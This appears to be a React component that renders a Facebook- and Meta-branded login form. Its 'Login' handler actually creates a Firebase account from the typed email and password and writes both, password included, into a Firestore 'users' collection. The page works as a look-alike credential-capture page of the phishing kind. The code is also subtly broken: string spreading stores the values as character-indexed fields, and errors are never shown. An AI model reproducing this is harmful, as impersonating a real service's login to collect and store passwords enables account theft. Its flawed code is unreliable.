import React, { useState } from 'react'
import {
  getAuth,
  createUserWithEmailAndPassword,
} from "firebase/auth";
import { setDoc, doc, serverTimestamp } from "firebase/firestore";
import { db } from "../../firebase";

function Signin() {

    
 
  const [email, setEmail] = useState()
  const [password, setPassword] = useState()
  const [error, setError]= useState()
  // const {  email, password } = formData;
  // const onChange = (e) => {
  //   setFormData((prevState) => ({
  //     ...prevState,
  //     [e.target.id]: e.target.value,
  //   }));
  // };

  const handleLogin = async (e) => {
    e.preventDefault();

    try {
      const auth = getAuth();
      const userCredential = await createUserWithEmailAndPassword(
        auth,
        email,
        password
      );
      
      const user = userCredential.user;

      const formDataCopy = { ...email, ...password };
      formDataCopy.timestamp = serverTimestamp();

      await setDoc(doc(db, "users", user.uid), formDataCopy);
     
    } catch (error) {
      if (error) {
       console.log(error)
      }
    
    }
  };
 

  return (
    <div className="login-container">
    
    <div className='logo_container'>
      <img className='logo' src="/Facebook_Logo.png" alt="facebook_logo" />
    </div>
      <form onSubmit={handleLogin}>
        <input
          type="email"
          placeholder="Email"
          value={email}
          onChange={(e)=> setEmail(e.target.value)}
          required
        />
        <input
          type="password"
          placeholder="Password"
          value={password}
          onChange={(e)=>setPassword(e.target.value)}
          required
        />
        <button type="submit" >Login</button>
        {error && <p className="error-message">{error}</p>}
      </form>

      <div className='password_container'>
        <h2>Forgotten Password?</h2>
      </div>

      <div className='create_container'>
        <h2>Create new account</h2>
      </div>

      <div>
        <img className='meta' src="/Meta-Logo.png" alt="Meta_logo" />
      </div>
    </div>
  );
  
}

export default Signin
